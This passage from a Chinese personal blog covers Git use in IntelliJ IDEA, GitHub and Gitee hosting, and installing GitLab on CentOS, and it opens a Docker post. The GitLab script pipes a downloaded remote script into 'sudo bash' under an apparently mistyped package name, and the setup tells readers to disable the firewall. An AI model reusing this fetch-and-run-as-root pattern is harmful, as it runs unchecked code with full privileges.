<p>2）在.gitconfig 文件中引用忽略配置文件（此文件在Windows的家目录中）</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[user]</span></span><br><span class="line">    name = Echo</span><br><span class="line">    email = <span class="number">2081297822</span>@qq<span class="selector-class">.com</span></span><br><span class="line"><span class="selector-attr">[core]</span></span><br><span class="line">	excludesfile = C:/用户/DELL/git<span class="selector-class">.ignore</span></span><br><span class="line">注意：用正斜线而不是反斜线</span><br></pre></td></tr></table></figure>

<h2 id="7-2-定位Git程序"><a href="#7-2-定位Git程序" class="headerlink" title="7.2 定位Git程序"></a>7.2 定位Git程序</h2><p>IDEA创建一个Maven项目<img src="/2022/02/22/Git/image-20220224160709229.png" alt="image-20220224160709229"></p>
<p>步骤：文件-&gt;设置—&gt;版本控制—&gt;Git-&gt;</p>
<p><img src="/2022/02/22/Git/image-20220224161411550.png" alt="image-20220224161411550"></p>
<h2 id="7-3-初始化本地库"><a href="#7-3-初始化本地库" class="headerlink" title="7.3 初始化本地库"></a>7.3 初始化本地库</h2><p>在最上面工具栏VCS(版本控制工具的设置)</p>
<p><img src="/2022/02/22/Git/image-20220224161908393.png" alt="image-20220224161908393"></p>
<p><img src="/2022/02/22/Git/image-20220224162018726.png" alt="image-20220224162018726"></p>
<p><img src="/2022/02/22/Git/image-20220224162251418.png" alt="image-20220224162251418"></p>
<p>pom.xml 变红了：未被追踪到，应添加到暂存区</p>
<h2 id="7-4-添加到暂存区"><a href="#7-4-添加到暂存区" class="headerlink" title="7.4 添加到暂存区"></a>7.4 添加到暂存区</h2><p><img src="/2022/02/22/Git/image-20220224162511675.png" alt="image-20220224162511675"></p>
<p>pom.xml 变绿了：已经添加到了暂存区，但是没有提交本地库</p>
<p>在/src/main/java下创建一个软件包：com.Echo.git</p>
<p>再在软件包下创建一个Java类：GitTest</p>
<p><img src="/2022/02/22/Git/image-20220224163018605.png" alt="image-20220224163018605"></p>
<p>可以先取消，然后写代码：<img src="/2022/02/22/Git/image-20220224163305184.png" alt="image-20220224163305184"></p>
<p>再添加暂存区：可以右键项目根目录（git-test)，把整个项目添加暂存区</p>
<h2 id="7-5-提交到本地库"><a href="#7-5-提交到本地库" class="headerlink" title="7.5 提交到本地库"></a>7.5 提交到本地库</h2><p><img src="/2022/02/22/Git/image-20220224175158139.png" alt="image-20220224175158139"></p>
<p><img src="/2022/02/22/Git/image-20220224175311030.png" alt="image-20220224175311030"></p>
<h2 id="7-6-切换版本"><a href="#7-6-切换版本" class="headerlink" title="7.6 切换版本"></a>7.6 切换版本</h2><p>修改文件后，添加暂存区，提交本地库</p>
<p><img src="/2022/02/22/Git/image-20220224175606609.png" alt="image-20220224175606609"></p>
<p><img src="/2022/02/22/Git/image-20220224175707155.png" alt="image-20220224175707155"></p>
<p>再弄第三个版本。</p>
<p><img src="/2022/02/22/Git/image-20220224180012879.png" alt="image-20220224180012879"></p>
<p>查看版本信息：IDEA左下角!<img src="/2022/02/22/Git/image-20220224180724346.png" alt="image-20220224180724346"></p>
<p>切换版本：<img src="/2022/02/22/Git/image-20220224181014769.png" alt="image-20220224181014769"></p>
<h2 id="7-7-创建分支"><a href="#7-7-创建分支" class="headerlink" title="7.7 创建分支"></a>7.7 创建分支</h2><p><img src="/2022/02/22/Git/image-20220224181512259.png" alt="image-20220224181512259"></p>
<p>点击后出现一个框<img src="/2022/02/22/Git/image-20220224181550885.png" alt="image-20220224181550885"></p>
<p>或者IDEA右下角：<img src="/2022/02/22/Git/image-20220224181617635.png" alt="image-20220224181617635"></p>
<p>新分支就可创建</p>
<h2 id="7-8-切换分支"><a href="#7-8-切换分支" class="headerlink" title="7.8 切换分支"></a>7.8 切换分支</h2><p>创建新分支后：<img src="/2022/02/22/Git/image-20220224181802461.png" alt="image-20220224181802461"></p>
<p>如何切换回去，点击即可： <img src="/2022/02/22/Git/image-20220224181831401.png" alt="image-20220224181831401"></p>
<h2 id="7-9-合并分支"><a href="#7-9-合并分支" class="headerlink" title="7.9 合并分支"></a>7.9 合并分支</h2><p><img src="/2022/02/22/Git/image-20220224182144086.png" alt="image-20220224182144086"></p>
<p>如果代码没有冲突，分支直接合并成功，分支合并成功后，代码自动提交，无需手动提交本地库</p>
<p><img src="/2022/02/22/Git/image-20220224182541949.png" alt="image-20220224182541949"></p>
<p>有两个绿色的代表有两个分支，合并到当前分支即可：<img src="/2022/02/22/Git/image-20220224182717540.png" alt="image-20220224182717540"></p>
<h2 id="7-10-解决冲突"><a href="#7-10-解决冲突" class="headerlink" title="7.10 解决冲突"></a>7.10 解决冲突</h2><p>1)在hot-fix分支上：提交本地库</p>
<p><img src="/2022/02/22/Git/image-20220224182912383.png" alt="image-20220224182912383"></p>
<p>切换回master：<img src="/2022/02/22/Git/image-20220224183023672.png" alt="image-20220224183023672"></p>
<p>修改master代码：<img src="/2022/02/22/Git/image-20220224183246127.png" alt="image-20220224183246127"></p>
<p>合并分支,产生冲突：<img src="/2022/02/22/Git/image-20220224183350511.png" alt="image-20220224183350511"></p>
<p>点击合并后：<img src="/2022/02/22/Git/image-20220224183548945.png" alt="image-20220224183548945"></p>
<p>左边master，右边hot-fix，中间是正常没有冲突的代码</p>
<p><img src="/2022/02/22/Git/image-20220224183718868.png" alt="image-20220224183718868"></p>
<p>×：不要这个代码；   》和《 ：是把代码拿到中间那个位置。结果：</p>
<p><img src="/2022/02/22/Git/image-20220224183859323.png" alt="image-20220224183859323"></p>
<p>日志信息：<img src="/2022/02/22/Git/image-20220224184031850.png" alt="image-20220224184031850"></p>
<h1 id="第八章-IDEA集成GitHub"><a href="#第八章-IDEA集成GitHub" class="headerlink" title="第八章 IDEA集成GitHub"></a>第八章 IDEA集成GitHub</h1><h2 id="8-1-设置GitHub账号"><a href="#8-1-设置GitHub账号" class="headerlink" title="8.1 设置GitHub账号"></a>8.1 设置GitHub账号</h2><p>文件-&gt;设置-&gt;版本控制-&gt;GitHub</p>
<p><img src="/2022/02/22/Git/image-20220224202610325.png" alt="image-20220224202610325"></p>
<p>直接授权<img src="/2022/02/22/Git/image-20220224202953114.png" alt="image-20220224202953114"></p>
<p><img src="/2022/02/22/Git/image-20220224211519334.png" alt="image-20220224211519334"></p>
<h2 id="8-2-分享工程到GitHub"><a href="#8-2-分享工程到GitHub" class="headerlink" title="8.2 分享工程到GitHub"></a>8.2 分享工程到GitHub</h2><p>等同于创建远程库再push</p>
<p><img src="/2022/02/22/Git/image-20220224213704185.png" alt="image-20220224213704185"></p>
<p><img src="/2022/02/22/Git/image-20220224213940328.png" alt="image-20220224213940328"></p>
<p><img src="/2022/02/22/Git/image-20220224215529424.png" alt="image-20220224215529424"></p>
<h2 id="8-3-push推送本地库到远程库"><a href="#8-3-push推送本地库到远程库" class="headerlink" title="8.3 push推送本地库到远程库"></a>8.3 push推送本地库到远程库</h2><p>修改代码<img src="/2022/02/22/Git/image-20220224215829892.png" alt="image-20220224215829892"></p>
<p><img src="/2022/02/22/Git/image-20220224220014112.png" alt="image-20220224220014112"></p>
<p>或使用SSH免密登录push<img src="/2022/02/22/Git/image-20220224220236599.png" alt="image-20220224220236599"></p>
<p><img src="/2022/02/22/Git/image-20220224220328672.png" alt="image-20220224220328672"></p>
<p>结果是成功：<img src="/2022/02/22/Git/image-20220224220418868.png" alt="image-20220224220418868"></p>
<p><strong>注意: push是将本地库代码推送到远程库，如果本地库代码跟远程库代码版本不一致，push的操作是会被拒绝的。也就是说，要想 push成功，一定要保证本地库的版本要比远程库的版本高!因此一个成熟的程序员在动手改本地代码之前，一定会先检查下远程库跟本地代码的区别!如果本地的代码版本已经落后，切记要先pull拉取一下远程库的代码，将本地代码更新到最新以后，然后再修改，提交，推送!</strong></p>
<p><strong>push前先pull一下</strong></p>
<h2 id="8-4-pull拉取远程库到本地库"><a href="#8-4-pull拉取远程库到本地库" class="headerlink" title="8.4 pull拉取远程库到本地库"></a>8.4 pull拉取远程库到本地库</h2><p><strong>注意: pull是拉取远端仓库代码到本地，如果远程库代码和本地库代码不一致，会自动合并，如果自动合并失败,还会涉及到手动解决冲突的问题。</strong></p>
<p>右键点击项目，可以将远程仓库的内容pull到本地仓库</p>
<p>在远程手动改一下代码 <img src="/2022/02/22/Git/image-20220224220743906.png" alt="image-20220224220743906"></p>
<p><img src="/2022/02/22/Git/image-20220224221207350.png" alt="image-20220224221207350"></p>
<p><img src="/2022/02/22/Git/image-20220224221430425.png" alt="image-20220224221430425"></p>
<p><img src="/2022/02/22/Git/image-20220224221921424.png" alt="image-20220224221921424"></p>
<h2 id="8-5-clone克隆远程库到本地"><a href="#8-5-clone克隆远程库到本地" class="headerlink" title="8.5 clone克隆远程库到本地"></a>8.5 clone克隆远程库到本地</h2><p><img src="/2022/02/22/Git/image-20220224222224207.png" alt="image-20220224222224207"></p>
<p><img src="/2022/02/22/Git/image-20220224222351407.png" alt="image-20220224222351407"></p>
<p>或：<img src="/2022/02/22/Git/image-20220224222839474.png" alt="image-20220224222839474"></p>
<p><img src="/2022/02/22/Git/image-20220224222911463.png" alt="image-20220224222911463"></p>
<p>填写HTTPS链接或者SSH链接都可，建议SSH免密登录</p>
<h1 id="第九章-国内代码托管中心-码云"><a href="#第九章-国内代码托管中心-码云" class="headerlink" title="第九章 国内代码托管中心-码云"></a>第九章 国内代码托管中心-码云</h1><h2 id="9-1-简介"><a href="#9-1-简介" class="headerlink" title="9.1 简介"></a>9.1 简介</h2><p>众所周知, GitHub 服务器在国外,使用GitHub作为项目托管网站,如果网速不好的话，严重影响使用体验，甚至会出现登录不上的情况。针对这个情况，大家也可以使用国内的项目托管网站-码云。码云是开源中国推出的基于Git的代码托管服务中心，网址是<a target="_blank" rel="noopener" href="https://gitee.com/,%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F%E8%B7%9FGitHub%E4%B8%80%E6%A0%B7,%E8%80%8C%E4%B8%94%E5%AE%83%E8%BF%98%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%AD%E6%96%87%E7%BD%91%E7%AB%99%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E8%8B%B1%E6%96%87%E4%B8%8D%E6%98%AF%E5%BE%88%E5%A5%BD%E5%AE%83%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E9%80%89%E6%8B%A9%E3%80%82">https://gitee.com/,使用方式跟GitHub一样,而且它还是一个中文网站，如果你英文不是很好它是最好的选择。</a></p>
<h2 id="9-2-码云账号注册和登录"><a href="#9-2-码云账号注册和登录" class="headerlink" title="9.2 码云账号注册和登录"></a>9.2 码云账号注册和登录</h2><p><img src="/2022/02/22/Git/image-20220224225337425.png" alt="image-20220224225337425"></p>
<h2 id="9-3-码云创建远程库"><a href="#9-3-码云创建远程库" class="headerlink" title="9.3 码云创建远程库"></a>9.3 码云创建远程库</h2><p>点击首页右上角加号，选择下面的新建仓库</p>
<p><img src="/2022/02/22/Git/image-20220224225553136.png" alt="image-20220224225553136"></p>
<p><img src="/2022/02/22/Git/image-20220224225611642.png" alt="image-20220224225611642"></p>
<p><img src="/2022/02/22/Git/image-20220224225835981.png" alt="image-20220224225835981"></p>
<p>推荐用HTTPS链接</p>
<h2 id="9-4-IDEA集成码云"><a href="#9-4-IDEA集成码云" class="headerlink" title="9.4 IDEA集成码云"></a>9.4 IDEA集成码云</h2><h3 id="9-4-1-IDEA安装码云插件"><a href="#9-4-1-IDEA安装码云插件" class="headerlink" title="9.4.1 IDEA安装码云插件"></a>9.4.1 IDEA安装码云插件</h3><p>IDEA默认不带码云插件，我们第一步要安装Gitee插件。</p>
<p>如图所示，在idea插件商店搜索Gitee，然后点击右侧的Install按钮。</p>
<p>安装好后可以在版本控制看到Gitee<img src="/2022/02/22/Git/image-20220225191443887.png" alt="image-20220225191443887"></p>
<h3 id="9-4-2-IDEA连接码云"><a href="#9-4-2-IDEA连接码云" class="headerlink" title="9.4.2 IDEA连接码云"></a>9.4.2 IDEA连接码云</h3><p><img src="/2022/02/22/Git/image-20220225191613966.png" alt="image-20220225191613966"></p>
<p>分享项目到码云：<img src="/2022/02/22/Git/image-20220225191734570.png" alt="image-20220225191734570"></p>
<p>或者提前创建好远程库，获取到远程库链接：<a target="_blank" rel="noopener" href="https://gitee.com/cjtyx/git-test.git">https://gitee.com/cjtyx/git-test.git</a></p>
<p>直接push<img src="/2022/02/22/Git/image-20220225192053363.png" alt="image-20220225192053363"></p>
<p><img src="/2022/02/22/Git/image-20220225192221587.png" alt="image-20220225192221587"></p>
<p><img src="/2022/02/22/Git/image-20220225192257491.png" alt="image-20220225192257491"></p>
<p><img src="/2022/02/22/Git/image-20220225192446815.png" alt="image-20220225192446815"></p>
<p>和GitHub一直</p>
<h2 id="9-5-码云复制GitHub项目"><a href="#9-5-码云复制GitHub项目" class="headerlink" title="9.5 码云复制GitHub项目"></a>9.5 码云复制GitHub项目</h2><p>码云提供了直接复制GitHub 项目的功能，方便我们做项目的迁移和下载。具体操作如下:</p>
<p>码云—&gt;点击“+” -&gt;新建仓库-&gt;点击导入已有仓库</p>
<p><img src="/2022/02/22/Git/image-20220225193104172.png" alt="image-20220225193104172"></p>
<p><img src="/2022/02/22/Git/image-20220225202503138.png" alt="image-20220225202503138"></p>
<p>授权登录后,就可以导入<img src="/2022/02/22/Git/image-20220225204023061.png" alt="image-20220225204023061"></p>
<p>当在GitHub上项目更新后，在gitee上<img src="/2022/02/22/Git/image-20220225204321140.png" alt="image-20220225204321140"></p>
<p>点击仓库名后面刷新就能更新到gitee上的</p>
<h1 id="第十章-自建代码托管平台-GitLab"><a href="#第十章-自建代码托管平台-GitLab" class="headerlink" title="第十章 自建代码托管平台-GitLab"></a>第十章 自建代码托管平台-GitLab</h1><h2 id="10-1-GitLab简介"><a href="#10-1-GitLab简介" class="headerlink" title="10.1 GitLab简介"></a>10.1 GitLab简介</h2><p>GitLab是由GitLabInc.开发，使用 MIT许可证的基于网络的Git仓库管理工具，且具有wiki和 issue跟踪功能。使用 Git作为代码管理工具，并在此基础上搭建起来的web服务。<br>GitLab由乌克兰程序员 DmitriyZaporozhets和ValerySizov开发，它使用Ruby 语言写成。后来，一些部分用Go语言重写。截止2018年5月，该公司约有290名团队成员，以及2000多名开源贡献者。GitLab被 IBM，Sony，JulichResearchCenter，NASA.Alibaba,Invincea，O’ReillyMedia，Leibniz-Rechenzentrum(LRZ)，CERN，SpaceX等组织使用。</p>
<h2 id="10-2-GitLab官网地址"><a href="#10-2-GitLab官网地址" class="headerlink" title="10.2 GitLab官网地址"></a>10.2 GitLab官网地址</h2><p>官网：<a target="_blank" rel="noopener" href="https://about.gitlab.com/">https://about.gitlab.com/</a></p>
<p>安装说明：<a target="_blank" rel="noopener" href="https://about.gitlab.com/installation">https://about.gitlab.com/installation</a></p>
<p><img src="/2022/02/22/Git/image-20220225211719767.png" alt="image-20220225211719767"></p>
<h2 id="10-3-GitLab安装"><a href="#10-3-GitLab安装" class="headerlink" title="10.3 GitLab安装"></a>10.3 GitLab安装</h2><h3 id="10-3-1-服务器准备"><a href="#10-3-1-服务器准备" class="headerlink" title="10.3.1 服务器准备"></a>10.3.1 服务器准备</h3><p>准备一个系统为CentOS7 及以上版本的服务器，要求内存4G，磁盘50G。关闭防火墙,并且配置好主机名和IP，保证服务器可以上网。<br>此教程使用虚拟机:主机名: gitlab-server  IP地址:192.168.6.200</p>
<p>修改ip: vim /etc/sysconfig/network-scripts/ifcfg-ens33<img src="/2022/02/22/Git/image-20220225213559717.png" alt="image-20220225213559717"></p>
<p>修改主机名：vim /etc/hostname    之后重启一下</p>
<p>配置Windows host文件以及Xshell链接地址</p>
<p>C:\Windows\System32\drivers\etc\hosts</p>
<p><img src="/2022/02/22/Git/image-20220225214054194.png" alt="image-20220225214054194"></p>
<p>Xshell链接地址:<img src="/2022/02/22/Git/image-20220225214159925.png" alt="image-20220225214159925"></p>
<h3 id="10-3-2-安装包准备"><a href="#10-3-2-安装包准备" class="headerlink" title="10.3.2 安装包准备"></a>10.3.2 安装包准备</h3><p>Yum在线安装gitlab- ce时，需要下载几百M的安装文件，非常耗时，所以最好提前把所需RPM包下载到本地，然后使用离线rpm的方式安装。</p>
<p>下载地址：<img src="/2022/02/22/Git/image-20220225212739372.png" alt="image-20220225212739372"></p>
<p>直接将此包上传到服务器/opt/module 目录下即可</p>
<h3 id="10-3-3-编写安装脚本"><a href="#10-3-3-编写安装脚本" class="headerlink" title="10.3.3 编写安装脚本"></a>10.3.3 编写安装脚本</h3><p>安装gitlab步骤繁琐，参考官网编写gitlab的安装脚本</p>
<p><img src="/2022/02/22/Git/image-20220225214816079.png" alt="image-20220225214816079"></p>
<p><img src="/2022/02/22/Git/image-20220225214515953.png" alt="image-20220225214515953"></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> gitlab-install.<span class="keyword">sh</span></span><br><span class="line"></span><br><span class="line">sudo rpm -ivh /<span class="keyword">opt</span>/module/gitlab-<span class="keyword">ce</span>-<span class="number">13.10</span>.<span class="number">2</span>-<span class="keyword">ce</span>.<span class="number">0</span>.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">sudo yum install -<span class="keyword">y</span> curl policycoreutils-<span class="keyword">python</span> openssh-server cronie</span><br><span class="line"></span><br><span class="line">sudo lokkit -s http -s ssh</span><br><span class="line"></span><br><span class="line">sudo yum install -<span class="keyword">y</span> postfix</span><br><span class="line"></span><br><span class="line">sudo service postfix start</span><br><span class="line"></span><br><span class="line">sudo chkconfig postfix <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line">curl http<span class="variable">s:</span>//packages.gitlab.<span class="keyword">com</span>/install/repositories/gitlab/gitlabce/script.rpm.<span class="keyword">sh</span> | sudo bash</span><br><span class="line"></span><br><span class="line">sudo EXTERNAL_URL=<span class="string">&quot;http://gitlab.example.com&quot;</span> yum -<span class="keyword">y</span> install gitlabce</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>给脚本增加执行权限:</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x gitlab-<span class="keyword">install</span>.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/22/Git/image-20220225215243762.png" alt="image-20220225215243762"></p>
<p>然后执行该脚本，开始安装 gitlab-ce。注意一定要保证服务器可以上网。</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@gitlab-server <span class="keyword">module</span>]# ./gitlab-install.sh</span><br><span class="line">警告： /opt/<span class="keyword">module</span>/gitlab-ce<span class="number">-13.10</span><span class="number">.2</span>-ce<span class="number">.0</span>.el7.x86_64.rpm: 头 V4</span><br><span class="line">RSA/SHA1 Signature, 密钥 ID f27eab47: NOKEY</span><br><span class="line">准备中... #################################</span><br><span class="line">[<span class="number">100</span>%]</span><br><span class="line">正在升级/安装...</span><br><span class="line"><span class="number">1</span>:gitlab-ce<span class="number">-13.10</span><span class="number">.2</span>-ce<span class="number">.0</span>.el7</span><br><span class="line">################################# [<span class="number">100</span>%]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="10-3-4-初始化GitLab服务"><a href="#10-3-4-初始化GitLab服务" class="headerlink" title="10.3.4 初始化GitLab服务"></a>10.3.4 初始化GitLab服务</h3><p>执行以下命令初始化 GitLab 服务，过程大概需要几分钟，耐心等待…</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@gitlab</span><span class="operator">-</span>server <span class="keyword">module</span>]# gitlab<span class="operator">-</span>ctl reconfigure</span><br><span class="line">。 。 。 。 。 。</span><br><span class="line"><span class="keyword">Running</span> handlers:</span><br><span class="line"><span class="keyword">Running</span> handlers complete</span><br><span class="line">Chef Client finished, <span class="number">425</span><span class="operator">/</span><span class="number">608</span> resources updated <span class="keyword">in</span> <span class="number">03</span> minutes <span class="number">08</span></span><br><span class="line">seconds</span><br><span class="line">gitlab Reconfigured<span class="operator">!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="10-3-5-启动GitLab服务"><a href="#10-3-5-启动GitLab服务" class="headerlink" title="10.3.5 启动GitLab服务"></a>10.3.5 启动GitLab服务</h3><p>执行以下命令启动 GitLab 服务，如需停止，执行 gitlab-ctl stop</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">root@gitlab-server</span> <span class="string">module</span>]<span class="comment"># gitlab-ctl start</span></span><br><span class="line"><span class="attr">ok: run: alertmanager:</span> <span class="string">(pid</span> <span class="number">6812</span><span class="string">)</span> <span class="string">134s</span></span><br><span class="line"><span class="attr">ok: run: gitaly:</span> <span class="string">(pid</span> <span class="number">6740</span><span class="string">)</span> <span class="string">135s</span></span><br><span class="line"><span class="attr">ok: run: gitlab-monitor:</span> <span class="string">(pid</span> <span class="number">6765</span><span class="string">)</span> <span class="string">135s</span></span><br><span class="line"><span class="attr">ok: run: gitlab-workhorse:</span> <span class="string">(pid</span> <span class="number">6722</span><span class="string">)</span> <span class="string">136s</span></span><br><span class="line"><span class="attr">ok: run: logrotate:</span> <span class="string">(pid</span> <span class="number">5994</span><span class="string">)</span> <span class="string">197s</span></span><br><span class="line"><span class="attr">ok: run: nginx:</span> <span class="string">(pid</span> <span class="number">5930</span><span class="string">)</span> <span class="string">203s</span></span><br><span class="line"><span class="attr">ok: run: node-exporter:</span> <span class="string">(pid</span> <span class="number">6234</span><span class="string">)</span> <span class="string">185s</span></span><br><span class="line"><span class="attr">ok: run: postgres-exporter:</span> <span class="string">(pid</span> <span class="number">6834</span><span class="string">)</span> <span class="string">133s</span></span><br><span class="line"><span class="attr">ok: run: postgresql:</span> <span class="string">(pid</span> <span class="number">5456</span><span class="string">)</span> <span class="string">257s</span></span><br><span class="line"><span class="attr">ok: run: prometheus:</span> <span class="string">(pid</span> <span class="number">6777</span><span class="string">)</span> <span class="string">134s</span></span><br><span class="line"><span class="attr">ok: run: redis:</span> <span class="string">(pid</span> <span class="number">5327</span><span class="string">)</span> <span class="string">263s</span></span><br><span class="line"><span class="attr">ok: run: redis-exporter:</span> <span class="string">(pid</span> <span class="number">6391</span><span class="string">)</span> <span class="string">173s</span></span><br><span class="line"><span class="attr">ok: run: sidekiq:</span> <span class="string">(pid</span> <span class="number">5797</span><span class="string">)</span> <span class="string">215s</span></span><br><span class="line"><span class="attr">ok: run: unicorn:</span> <span class="string">(pid</span> <span class="number">5728</span><span class="string">)</span> <span class="string">221s</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="10-3-6-使用浏览器访问GitLab"><a href="#10-3-6-使用浏览器访问GitLab" class="headerlink" title="10.3.6 使用浏览器访问GitLab"></a>10.3.6 使用浏览器访问GitLab</h3><p>使用主机名或者 IP 地址即可访问 GitLab 服务。可配一下 windows 的 hosts 文件（C:\Windows\System32\drivers\etc）。默认端口80</p>
<p><img src="/2022/02/22/Git/image-20220225220436601.png" alt="image-20220225220436601"></p>
<p>首次登陆之前，需要修改下 GitLab 提供的 root 账户的密码，要求 8 位以上，包含大小写子母和特殊符号。然后使用修改后的密码登录GitLab。</p>
<p><img src="/2022/02/22/Git/image-20220225220514500.png" alt="image-20220225220514500"></p>
<p>GitLab 登录成功   </p>
<p><img src="/2022/02/22/Git/image-20220225220533027.png" alt="image-20220225220533027"></p>
<h3 id="10-3-7-GitLab创建远程库"><a href="#10-3-7-GitLab创建远程库" class="headerlink" title="10.3.7 GitLab创建远程库"></a>10.3.7 GitLab创建远程库</h3><p>点New projects</p>
<p><img src="/2022/02/22/Git/image-20220225220549064.png" alt="image-20220225220549064"></p>
<p><img src="/2022/02/22/Git/image-20220225220603110.png" alt="image-20220225220603110"></p>
<p><img src="/2022/02/22/Git/image-20220225220620407.png" alt="image-20220225220620407"></p>
<h3 id="10-3-8-IDEA集成GitLab"><a href="#10-3-8-IDEA集成GitLab" class="headerlink" title="10.3.8 IDEA集成GitLab"></a>10.3.8 IDEA集成GitLab</h3><p>安装Gitlab插件</p>
<p><img src="/2022/02/22/Git/image-20220225220641597.png" alt="image-20220225220641597"></p>
<p><img src="/2022/02/22/Git/image-20220225221714767.png" alt="image-20220225221714767"></p>
<p><img src="/2022/02/22/Git/image-20220225221916305.png" alt="image-20220225221916305"></p>
<p><img src="/2022/02/22/Git/image-20220225221936939.png" alt="image-20220225221936939"></p>
<p>push-&gt;定义远程-&gt;粘贴gitlab链接</p>
<p><img src="/2022/02/22/Git/image-20220225222057052.png" alt="image-20220225222057052"></p>
<p>Git操作等与Github、Gitee的IDEA插件大同小异</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/07/Docker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/07/Docker/" class="post-title-link" itemprop="url">Docker</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-07 14:22:05" itemprop="dateCreated datePublished" datetime="2022-02-07T14:22:05+08:00">2022-02-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-02-16 17:04:56" itemprop="dateModified" datetime="2022-02-16T17:04:56+08:00">2022-02-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>44k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>40 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><p> <a href="C:\Users\DELL\Desktop\学习资料\Docker2022.emmx">Docker2022.emmx</a> </p>
<p>理念</p>
<p><img src="/2022/02/07/Docker/image-20220207160920948.png" alt="image-20220207160920948"></p>
<p>解决了运行环境和配置问题的软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。</p>
<p> 下载：<img src="/2022/02/07/Docker/image-20220207213525918.png" alt="image-20220207213525918"></p>
<p><img src="/2022/02/07/Docker/image-20220207215908104.png" alt="image-20220207215908104"></p>
<p>docker的基本组成：镜像、容器、仓库</p>
<p>Docker镜像（Image）就是一个只读的模板。镜像可以用来创建Docker容器，一个镜像可以创建很多容器。</p>
<p>Docker利用容器（Container)独立运行的一个或一组应用，应用程序或服务运行在容器里面，容器就类似于一个虚拟化的运行环境，容器是用镜像创建的运行实例。可以把容器看做是一个简易版的Linux 环境〈包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p>
